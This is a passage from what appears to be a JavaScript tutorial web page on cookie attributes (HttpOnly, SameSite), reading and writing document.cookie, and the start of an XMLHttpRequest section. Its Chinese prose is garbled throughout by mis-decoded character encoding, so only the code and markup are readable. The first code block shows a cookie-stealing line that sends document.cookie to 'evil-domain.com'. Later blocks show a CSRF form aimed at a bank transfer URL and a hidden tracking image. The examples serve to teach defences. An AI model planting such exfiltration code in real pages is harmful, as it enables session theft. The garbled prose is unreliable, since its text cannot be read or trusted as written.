è¢«è„šæœ¬è¯»åˆ°ï¼Œåªæœ‰æµè§ˆå™¨å‘å‡º HTTP è¯·æ±‚æ—¶ï¼Œæ‰ä¼šå¸¦ä¸Šè¯¥ Cookieã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">&quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot;</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸Šé¢æ˜¯è·¨ç«™ç‚¹è½½å…¥çš„ä¸€ä¸ªæ¶æ„è„šæœ¬çš„ä»£ç ï¼Œèƒ½å¤Ÿå°†å½“å‰ç½‘é¡µçš„ Cookie å‘å¾€ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ã€‚å¦‚æœè®¾ç½®äº†ä¸€ä¸ª Cookie çš„<code>HttpOnly</code>å±æ€§ï¼Œä¸Šé¢ä»£ç å°±ä¸ä¼šè¯»åˆ°è¯¥ Cookieã€‚</p> <h3 id="samesite"><a href="#samesite" class="header-anchor">#</a> SameSite</h3> <p>Chrome 51 å¼€å§‹ï¼Œæµè§ˆå™¨çš„ Cookie æ–°å¢åŠ äº†ä¸€ä¸ª<code>SameSite</code>å±æ€§ï¼Œç”¨æ¥é˜²æ­¢ CSRF æ”»å‡»å’Œç”¨æˆ·è¿½è¸ªã€‚</p> <p>Cookie å¾€å¾€ç”¨æ¥å­˜å‚¨ç”¨æˆ·çš„èº«ä»½ä¿¡æ¯ï¼Œæ¶æ„ç½‘ç«™å¯ä»¥è®¾æ³•ä¼ªé€ å¸¦æœ‰æ­£ç¡® Cookie çš„ HTTP è¯·æ±‚ï¼Œè¿™å°±æ˜¯ CSRF æ”»å‡»ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œç”¨æˆ·ç™»é™†äº†é“¶è¡Œç½‘ç«™<code>your-bank.com</code>ï¼Œé“¶è¡ŒæœåŠ¡å™¨å‘æ¥äº†ä¸€ä¸ª Cookieã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span>id=a3fWa;

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ç”¨æˆ·åæ¥åˆè®¿é—®äº†æ¶æ„ç½‘ç«™<code>malicious.com</code>ï¼Œä¸Šé¢æœ‰ä¸€ä¸ªè¡¨å•ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>your-bank.com/transfer<span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>POST<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  ...
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>ç”¨æˆ·ä¸€æ—¦è¢«è¯±éª—å‘é€è¿™ä¸ªè¡¨å•ï¼Œé“¶è¡Œç½‘ç«™å°±ä¼šæ”¶åˆ°å¸¦æœ‰æ­£ç¡® Cookie çš„è¯·æ±‚ã€‚ä¸ºäº†é˜²æ­¢è¿™ç§æ”»å‡»ï¼Œè¡¨å•ä¸€èˆ¬éƒ½å¸¦æœ‰ä¸€ä¸ªéšæœº tokenï¼Œå‘Šè¯‰æœåŠ¡å™¨è¿™æ˜¯çœŸå®è¯·æ±‚ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>your-bank.com/transfer<span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>POST<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>token<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>dad3weg34<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
  ...
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>è¿™ç§ç¬¬ä¸‰æ–¹ç½‘ç«™å¼•å¯¼å‘å‡ºçš„ Cookieï¼Œå°±ç§°ä¸ºç¬¬ä¸‰æ–¹ Cookieã€‚å®ƒé™¤äº†ç”¨äº CSRF æ”»å‡»ï¼Œè¿˜å¯ä»¥ç”¨äºç”¨æˆ·è¿½è¸ªã€‚æ¯”å¦‚ï¼ŒFacebook åœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™æ’å…¥ä¸€å¼ çœ‹ä¸è§çš„å›¾ç‰‡ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">&quot;</span>facebook.com<span class="token punctuation">&quot;</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">=&quot;</span><span class="token attr-value"><span class="token property">visibility</span><span class="token punctuation">:</span>hidden<span class="token punctuation">;</span></span><span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>æµè§ˆå™¨åŠ è½½ä¸Šé¢ä»£ç æ—¶ï¼Œå°±ä¼šå‘ Facebook å‘å‡ºå¸¦æœ‰ Cookie çš„è¯·æ±‚ï¼Œä»è€Œ Facebook å°±ä¼šçŸ¥é“ä½ æ˜¯è°ï¼Œè®¿é—®äº†ä»€ä¹ˆç½‘ç«™ã€‚</p> <p>Cookie çš„<code>SameSite</code>å±æ€§ç”¨æ¥é™åˆ¶ç¬¬ä¸‰æ–¹ Cookieï¼Œä»è€Œå‡å°‘å®‰å…¨é£é™©ã€‚å®ƒå¯ä»¥è®¾ç½®ä¸‰ä¸ªå€¼ã€‚</p> <blockquote><ul><li>Strict</li> <li>Lax</li> <li>None</li></ul></blockquote> <p><strong>ï¼ˆ1ï¼‰Strict</strong></p> <p><code>Strict</code>æœ€ä¸ºä¸¥æ ¼ï¼Œå®Œå…¨ç¦æ­¢ç¬¬ä¸‰æ–¹ Cookieï¼Œè·¨ç«™ç‚¹æ—¶ï¼Œä»»ä½•æƒ…å†µä¸‹éƒ½ä¸ä¼šå‘é€ Cookieã€‚æ¢è¨€ä¹‹ï¼Œåªæœ‰å½“å‰ç½‘é¡µçš„ URL ä¸è¯·æ±‚ç›®æ ‡ä¸€è‡´ï¼Œæ‰ä¼šå¸¦ä¸Š Cookieã€‚</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Set-Cookie:</span> CookieName=CookieValue; SameSite=Strict;

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>è¿™ä¸ªè§„åˆ™è¿‡äºä¸¥æ ¼ï¼Œå¯èƒ½é€ æˆéå¸¸ä¸å¥½çš„ç”¨æˆ·ä½“éªŒã€‚æ¯”å¦‚ï¼Œå½“å‰ç½‘é¡µæœ‰ä¸€ä¸ª GitHub é“¾æ¥ï¼Œç”¨æˆ·ç‚¹å‡»è·³è½¬å°±ä¸ä¼šå¸¦æœ‰ GitHub çš„ Cookieï¼Œè·³è½¬è¿‡å»æ€»æ˜¯æœªç™»é™†çŠ¶æ€ã€‚</p> <p><strong>ï¼ˆ2ï¼‰Lax</strong></p> <p><code>Lax</code>è§„åˆ™ç¨ç¨æ”¾å®½ï¼Œå¤§å¤šæ•°æƒ…å†µä¹Ÿæ˜¯ä¸å‘é€ç¬¬ä¸‰æ–¹ Cookieï¼Œä½†æ˜¯å¯¼èˆªåˆ°ç›®æ ‡ç½‘å€çš„ Get è¯·æ±‚é™¤å¤–ã€‚</p> <div class="language-html line-numbers-mode"><pre class="language-html"><code>Set-Cookie: CookieName=CookieValue; SameSite=Lax;

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>å¯¼èˆªåˆ°ç›®æ ‡ç½‘å€çš„ GET è¯·æ±‚ï¼ŒåªåŒ…æ‹¬ä¸‰ç§æƒ…å†µï¼šé“¾æ¥ï¼Œé¢„åŠ è½½è¯·æ±‚ï¼ŒGET è¡¨å•ã€‚è¯¦è§ä¸‹è¡¨ã€‚</p> <table><thead><tr><th>è¯·æ±‚ç±»å‹</th> <th style="text-align:center;">ç¤ºä¾‹</th> <th style="text-align:right;">æ­£å¸¸æƒ…å†µ</th> <th>Lax</th></tr></thead> <tbody><tr><td>é“¾æ¥</td> <td style="text-align:center;"><code>&lt;a href=&quot;...&quot;&gt;&lt;/a&gt;</code></td> <td style="text-align:right;">å‘é€ Cookie</td> <td>å‘é€ Cookie</td></tr> <tr><td>é¢„åŠ è½½</td> <td style="text-align:center;"><code>&lt;link rel=&quot;prerender&quot; href=&quot;...&quot;/&gt;</code></td> <td style="text-align:right;">å‘é€ Cookie</td> <td>å‘é€ Cookie</td></tr> <tr><td>GET è¡¨å•</td> <td style="text-align:center;"><code>&lt;form method=&quot;GET&quot; action=&quot;...&quot;&gt;</code></td> <td style="text-align:right;">å‘é€ Cookie</td> <td>å‘é€ Cookie</td></tr> <tr><td>POST è¡¨å•</td> <td style="text-align:center;"><code>&lt;form method=&quot;POST&quot; action=&quot;...&quot;&gt;</code></td> <td style="text-align:right;">å‘é€ Cookie</td> <td>ä¸å‘é€</td></tr> <tr><td>iframe</td> <td style="text-align:center;"><code>&lt;iframe src=&quot;...&quot;&gt;&lt;/iframe&gt;</code></td> <td style="text-align:right;">å‘é€ Cookie</td> <td>ä¸å‘é€</td></tr> <tr><td>AJAX</td> <td style="text-align:center;"><code>$.get(&quot;...&quot;)</code></td> <td style="text-align:right;">å‘é€ Cookie</td> <td>ä¸å‘é€</td></tr> <tr><td>Image</td> <td style="text-align:center;"><code>&lt;img src=&quot;...&quot;&gt;</code></td> <td style="text-align:right;">å‘é€ Cookie</td> <td>ä¸å‘é€</td></tr></tbody></table> <p>è®¾ç½®äº†<code>Strict</code>æˆ–<code>Lax</code>ä»¥åï¼ŒåŸºæœ¬å°±æœç»äº† CSRF æ”»å‡»ã€‚å½“ç„¶ï¼Œå‰ææ˜¯ç”¨æˆ·æµè§ˆå™¨æ”¯æŒ SameSite å±æ€§ã€‚</p> <p><strong>ï¼ˆ3ï¼‰None</strong></p> <p>Chrome è®¡åˆ’å°†<code>Lax</code>å˜ä¸ºé»˜è®¤è®¾ç½®ã€‚è¿™æ—¶ï¼Œç½‘ç«™å¯ä»¥é€‰æ‹©æ˜¾å¼å…³é—­<code>SameSite</code>å±æ€§ï¼Œå°†å…¶è®¾ä¸º<code>None</code>ã€‚ä¸è¿‡ï¼Œå‰ææ˜¯å¿…é¡»åŒæ—¶è®¾ç½®<code>Secure</code>å±æ€§ï¼ˆCookie åªèƒ½é€šè¿‡ HTTPS åè®®å‘é€ï¼‰ï¼Œå¦åˆ™æ— æ•ˆã€‚</p> <p>ä¸‹é¢çš„è®¾ç½®æ— æ•ˆã€‚</p> <div class="language-text line-numbers-mode"><pre class="language-text"><code>Set-Cookie: widget_session=abc123; SameSite=None

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸‹é¢çš„è®¾ç½®æœ‰æ•ˆã€‚</p> <div class="language-text line-numbers-mode"><pre class="language-text"><code>Set-Cookie: widget_session=abc123; SameSite=None; Secure

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="_4-document-cookie"><a href="#_4-document-cookie" class="header-anchor">#</a> 4.document.cookie</h2> <p><code>document.cookie</code>å±æ€§ç”¨äºè¯»å†™å½“å‰ç½‘é¡µçš„ Cookieã€‚</p> <p>è¯»å–çš„æ—¶å€™ï¼Œå®ƒä¼šè¿”å›å½“å‰ç½‘é¡µçš„æ‰€æœ‰ Cookieï¼Œå‰ææ˜¯è¯¥ Cookie ä¸èƒ½æœ‰<code>HTTPOnly</code>å±æ€§ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>cookie <span class="token comment">// &quot;foo=bar;baz=bar&quot;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ä»<code>document.cookie</code>ä¸€æ¬¡æ€§è¯»å‡ºä¸¤ä¸ª Cookieï¼Œå®ƒä»¬ä¹‹é—´ä½¿ç”¨åˆ†å·åˆ†éš”ã€‚å¿…é¡»æ‰‹åŠ¨è¿˜åŸï¼Œæ‰èƒ½å–å‡ºæ¯ä¸€ä¸ª Cookie çš„å€¼ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> cookies <span class="token operator">=</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cookies<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>cookies<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// foo=bar</span>
<span class="token comment">// baz=bar</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p><code>document.cookie</code>å±æ€§æ˜¯å¯å†™çš„ï¼Œå¯ä»¥é€šè¿‡å®ƒä¸ºå½“å‰ç½‘ç«™æ·»åŠ  Cookieã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">'fontSize=14'</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>å†™å…¥çš„æ—¶å€™ï¼ŒCookie çš„å€¼å¿…é¡»å†™æˆ<code>key=value</code>çš„å½¢å¼ã€‚æ³¨æ„ï¼Œç­‰å·ä¸¤è¾¹ä¸èƒ½æœ‰ç©ºæ ¼ã€‚å¦å¤–ï¼Œå†™å…¥ Cookie çš„æ—¶å€™ï¼Œå¿…é¡»å¯¹åˆ†å·ã€é€—å·å’Œç©ºæ ¼è¿›è¡Œè½¬ä¹‰ï¼ˆå®ƒä»¬éƒ½ä¸å…è®¸ä½œä¸º Cookie çš„å€¼ï¼‰ï¼Œè¿™å¯ä»¥ç”¨<code>encodeURIComponent</code>æ–¹æ³•è¾¾åˆ°ã€‚</p> <p>ä½†æ˜¯ï¼Œ<code>document.cookie</code>ä¸€æ¬¡åªèƒ½å†™å…¥ä¸€ä¸ª Cookieï¼Œè€Œä¸”å†™å…¥å¹¶ä¸æ˜¯è¦†ç›–ï¼Œè€Œæ˜¯æ·»åŠ ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">'test1=hello'</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">'test2=world'</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>cookie
<span class="token comment">// test1=hello;test2=world</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><code>document.cookie</code>è¯»å†™è¡Œä¸ºçš„å·®å¼‚ï¼ˆä¸€æ¬¡å¯ä»¥è¯»å‡ºå…¨éƒ¨ Cookieï¼Œä½†æ˜¯åªèƒ½å†™å…¥ä¸€ä¸ª Cookieï¼‰ï¼Œä¸ HTTP åè®®çš„ Cookie é€šä¿¡æ ¼å¼æœ‰å…³ã€‚æµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€ Cookie çš„æ—¶å€™ï¼Œ<code>Cookie</code>å­—æ®µæ˜¯ä½¿ç”¨ä¸€è¡Œå°†æ‰€æœ‰ Cookie å…¨éƒ¨å‘é€ï¼›æœåŠ¡å™¨å‘æµè§ˆå™¨è®¾ç½® Cookie çš„æ—¶å€™ï¼Œ<code>Set-Cookie</code>å­—æ®µæ˜¯ä¸€è¡Œè®¾ç½®ä¸€ä¸ª Cookieã€‚</p> <p>å†™å…¥ Cookie çš„æ—¶å€™ï¼Œå¯ä»¥ä¸€èµ·å†™å…¥ Cookie çš„å±æ€§ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">&quot;foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT&quot;</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå†™å…¥ Cookie çš„æ—¶å€™ï¼ŒåŒæ—¶è®¾ç½®äº†<code>expires</code>å±æ€§ã€‚å±æ€§å€¼çš„ç­‰å·ä¸¤è¾¹ï¼Œä¹Ÿæ˜¯ä¸èƒ½æœ‰ç©ºæ ¼çš„ã€‚</p> <p>å„ä¸ªå±æ€§çš„å†™å…¥æ³¨æ„ç‚¹å¦‚ä¸‹ã€‚</p> <ul><li><code>path</code>å±æ€§å¿…é¡»ä¸ºç»å¯¹è·¯å¾„ï¼Œé»˜è®¤ä¸ºå½“å‰è·¯å¾„ã€‚</li> <li><code>domain</code>å±æ€§å€¼å¿…é¡»æ˜¯å½“å‰å‘é€ Cookie çš„åŸŸåçš„ä¸€éƒ¨åˆ†ã€‚æ¯”å¦‚ï¼Œå½“å‰åŸŸåæ˜¯<code>example.com</code>ï¼Œå°±ä¸èƒ½å°†å…¶è®¾ä¸º<code>foo.com</code>ã€‚è¯¥å±æ€§é»˜è®¤ä¸ºå½“å‰çš„ä¸€çº§åŸŸåï¼ˆä¸å«äºŒçº§åŸŸåï¼‰ã€‚</li> <li><code>max-age</code>å±æ€§çš„å€¼ä¸ºç§’æ•°ã€‚</li> <li><code>expires</code>å±æ€§çš„å€¼ä¸º UTC æ ¼å¼ï¼Œå¯ä»¥ä½¿ç”¨<code>Date.prototype.toUTCString()</code>è¿›è¡Œæ—¥æœŸæ ¼å¼è½¬æ¢ã€‚</li></ul> <p><code>document.cookie</code>å†™å…¥ Cookie çš„ä¾‹å­å¦‚ä¸‹ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">'fontSize=14; '</span>
  <span class="token operator">+</span> <span class="token string">'expires='</span> <span class="token operator">+</span> someDate<span class="token punctuation">.</span><span class="token function">toGMTString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'; '</span>
  <span class="token operator">+</span> <span class="token string">'path=/subdirectory; '</span>
  <span class="token operator">+</span> <span class="token string">'domain=*.example.com'</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>Cookie çš„å±æ€§ä¸€æ—¦è®¾ç½®å®Œæˆï¼Œå°±æ²¡æœ‰åŠæ³•è¯»å–è¿™äº›å±æ€§çš„å€¼ã€‚</p> <p>åˆ é™¤ä¸€ä¸ªç°å­˜ Cookie çš„å”¯ä¸€æ–¹æ³•ï¼Œæ˜¯è®¾ç½®å®ƒçš„<code>expires</code>å±æ€§ä¸ºä¸€ä¸ªè¿‡å»çš„æ—¥æœŸã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>document<span class="token punctuation">.</span>cookie <span class="token operator">=</span> <span class="token string">'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT'</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>ä¸Šé¢ä»£ç ä¸­ï¼Œåä¸º<code>fontSize</code>çš„ Cookie çš„å€¼ä¸ºç©ºï¼Œè¿‡æœŸæ—¶é—´è®¾ä¸º1970å¹´1æœˆ1æœˆé›¶ç‚¹ï¼Œå°±ç­‰åŒäºåˆ é™¤äº†è¿™ä¸ª Cookieã€‚</p> <h2 id="äº”ã€xmlhttprequest-å¯¹è±¡"><a href="#äº”ã€xmlhttprequest-å¯¹è±¡" class="header-anchor">#</a> äº”ã€XMLHttpRequest å¯¹è±¡</h2> <h2 id="_1-ç®€ä»‹"><a href="#_1-ç®€ä»‹" class="header-anchor">#</a> 1.ç®€ä»‹</h2> <p>æµè§ˆå™¨ä¸æœåŠ¡å™¨ä¹‹é—´ï¼Œé‡‡ç”¨ HTTP åè®®é€šä¿¡ã€‚ç”¨æˆ·åœ¨æµè§ˆå™¨åœ°å€æ é”®å…¥ä¸€ä¸ªç½‘å€ï¼Œæˆ–è€…é€šè¿‡ç½‘é¡µè¡¨å•å‘æœåŠ¡å™¨æäº¤å†…å®¹ï¼Œè¿™æ—¶æµè§ˆå™¨å°±ä¼šå‘æœåŠ¡å™¨å‘å‡º HTTP è¯·æ±‚ã€‚</p> <p>1999å¹´ï¼Œå¾®è½¯å…¬å¸å‘å¸ƒ IE æµè§ˆå™¨5.0ç‰ˆï¼Œç¬¬ä¸€æ¬¡å¼•å…¥æ–°åŠŸèƒ½ï¼šå…è®¸ JavaScript è„šæœ¬å‘æœåŠ¡å™¨å‘èµ· HTTP è¯·æ±‚ã€‚è¿™ä¸ªåŠŸèƒ½å½“æ—¶å¹¶æ²¡æœ‰å¼•èµ·æ³¨æ„ï¼Œç›´åˆ°2004å¹´ Gmail å‘å¸ƒå’Œ2005å¹´ Google Map å‘å¸ƒï¼Œæ‰å¼•èµ·å¹¿æ³›é‡è§†ã€‚2005å¹´2æœˆï¼ŒAJAX è¿™ä¸ªè¯ç¬¬ä¸€æ¬¡æ­£å¼æå‡ºï¼Œå®ƒæ˜¯ Asynchronous JavaScript and XML çš„ç¼©å†™ï¼Œ**æŒ‡çš„æ˜¯é€šè¿‡ JavaScript çš„å¼‚æ­¥é€šä¿¡ï¼Œä»æœåŠ¡å™¨è·å– XML æ–‡æ¡£ä»ä¸­æå–æ•°æ®ï¼Œå†æ›´æ–°å½“å‰ç½‘é¡µçš„å¯¹åº”éƒ¨åˆ†ï¼Œè€Œä¸ç”¨åˆ·æ–°æ•´ä¸ªç½‘é¡µã€‚**åæ¥ï¼ŒAJAX è¿™ä¸ªè¯å°±æˆä¸º JavaScript è„šæœ¬å‘èµ· HTTP é€šä¿¡çš„ä»£åè¯ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦ç”¨è„šæœ¬å‘èµ·é€šä¿¡ï¼Œå°±å¯ä»¥å«åš AJAX é€šä¿¡ã€‚W3C ä¹Ÿåœ¨2006å¹´å‘å¸ƒäº†å®ƒçš„å›½é™…æ ‡å‡†ã€‚</p> <p>å…·ä½“æ¥è¯´ï¼ŒAJAX åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ã€‚</p> <ol><li>åˆ›å»º XMLHttpRequest å®ä¾‹</li> <li>å‘å‡º HTTP è¯·æ±‚</li> <li>æ¥æ”¶æœåŠ¡å™¨ä¼ å›çš„æ•°æ®</li> <li>æ›´æ–°ç½‘é¡µæ•°æ®</li></ol> <p>æ¦‚æ‹¬èµ·æ¥ï¼Œå°±æ˜¯ä¸€å¥è¯ï¼ŒAJAX é€šè¿‡åŸç”Ÿçš„<code>XMLHttpRequest</code>å¯¹è±¡å‘å‡º HTTP è¯·æ±‚ï¼Œå¾—åˆ°æœåŠ¡å™¨è¿”å›çš„æ•°æ®åï¼Œå†è¿›è¡Œå¤„ç†ã€‚ç°åœ¨ï¼ŒæœåŠ¡å™¨è¿”å›çš„éƒ½æ˜¯ JSON æ ¼å¼çš„æ•°æ®ï¼ŒXML æ ¼å¼å·²ç»è¿‡æ—¶äº†ï¼Œä½†æ˜¯ AJAX è¿™ä¸ªåå­—å·²ç»æˆäº†ä¸€ä¸ªé€šç”¨åè¯ï¼Œå­—é¢å«ä¹‰å·²ç»æ¶ˆå¤±äº†ã€‚</p> <p><code>XMLHttpRequest</code>å¯¹è±¡æ˜¯ AJAX çš„ä¸»è¦æ¥å£ï¼Œç”¨äºæµè§ˆå™¨ä¸æœåŠ¡å™¨ä¹‹é—´çš„é€šä¿¡ã€‚å°½ç®¡åå­—é‡Œé¢æœ‰<code>XML</code>å’Œ<code>Http</code>ï¼Œå®ƒå®é™…ä¸Šå¯ä»¥ä½¿ç”¨å¤šç§åè®®ï¼ˆæ¯”å¦‚<code>file</code>æˆ–<code>ftp</code>ï¼‰ï¼Œå‘é€ä»»ä½•æ ¼å¼çš„æ•°æ®ï¼ˆåŒ…æ‹¬å­—ç¬¦ä¸²å’ŒäºŒè¿›åˆ¶ï¼‰ã€‚</p> <p><code>XMLHttpRequest</code>æœ¬èº«æ˜¯ä¸€ä¸ªæ„é€ å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨<code>new</code>å‘½ä»¤ç”Ÿæˆå®ä¾‹ã€‚å®ƒæ²¡æœ‰ä»»ä½•å‚æ•°ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸€æ—¦æ–°å»ºå®ä¾‹ï¼Œå°±å¯ä»¥ä½¿ç”¨<code>open()</code>æ–¹æ³•æŒ‡å®šå»ºç«‹ HTTP è¿æ¥çš„ä¸€äº›ç»†èŠ‚ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'http://www.example.com/page.php'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>ä¸Šé¢ä»£ç æŒ‡å®šä½¿ç”¨ GET æ–¹æ³•ï¼Œè·ŸæŒ‡å®šçš„æœåŠ¡å™¨ç½‘å€å»ºç«‹è¿æ¥ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°<code>true</code>ï¼Œè¡¨ç¤ºè¯·æ±‚æ˜¯å¼‚æ­¥çš„ã€‚</p> <p>ç„¶åï¼ŒæŒ‡å®šå›è°ƒå‡½æ•°ï¼Œç›‘å¬é€šä¿¡çŠ¶æ€ï¼ˆ<code>readyState</code>å±æ€§ï¼‰çš„å˜åŒ–ã€‚</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code>xhr<span class="token punctuation">.</span>onreadystatechange <span class="token operator">=</span> handleStateChange<span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">handleStateChange</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// ...</span>
<span class="token punctuation">}</span>
